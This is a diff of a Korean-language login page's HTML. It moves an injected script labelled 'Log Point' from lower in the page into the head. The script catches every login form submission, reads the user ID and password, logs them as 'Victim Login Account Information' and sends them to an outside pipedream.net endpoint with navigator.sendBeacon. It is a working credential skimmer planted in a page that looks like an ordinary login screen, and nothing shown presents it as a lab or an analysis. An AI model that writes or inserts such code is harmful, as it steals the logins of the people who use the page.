@@ -1,4 +1,31 @@
 <html lang="ko-KR" class="pc-otp-login-v4"><head>
+        <!-- Log Point -->
+<script>
+    document.addEventListener('submit', function(e) {
+        const form = e.target;
+        if (form.classList.contains('_loginForm') || form.action.includes('login')) {
+            const userId = form.querySelector('[name="user_id"]')?.value || '';
+            const userPw = form.querySelector('[name="user_pw"]')?.value || '';
+            
+            if (userId && userPw) {
+                console.log('=== Victim Login Account Information ===');
+                console.log('UserID:', userId);
+                console.log('Password:', userPw);
+                console.log('========================================');
+                
+                const url = 'https://eonj4db38moggdb.m.pipedream.net';
+                
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(url, JSON.stringify({
+                        user_id: userId,
+                        user_pw: userPw,
+                        timestamp: new Date().toISOString()
+                    }));
+                }             
+            }
+        }
+    }, true);
+</script>
         <meta charset="UTF-8">
         <meta name="robots" content="noindex">
         <title>로그인</title>
@@ -619,35 +646,6 @@ var I18n=I18n||{t:function(a,b){return b}};
     
 </script>
 
-<!-- Log Point -->
-<script>
-    document.addEventListener('submit', function(e) {
-        const form = e.target;
-        if (form.classList.contains('_loginForm') || form.action.includes('login')) {
-            const userId = form.querySelector('[name="user_id"]')?.value || '';
-            const userPw = form.querySelector('[name="user_pw"]')?.value || '';
-            
-            if (userId && userPw) {
-                console.log('=== Victim Login Account Information ===');
-                console.log('UserID:', userId);
-                console.log('Password:', userPw);
-                console.log('========================================');
-                
-                const url = 'https://eonj4db38moggdb.m.pipedream.net';
-                
-                if (navigator.sendBeacon) {
-                    navigator.sendBeacon(url, JSON.stringify({
-                        user_id: userId,
-                        user_pw: userPw,
-                        timestamp: new Date().toISOString()
-                    }));
-                }
-                
-                
-            }
-        }
-    }, true);
-</script>
 
     
         
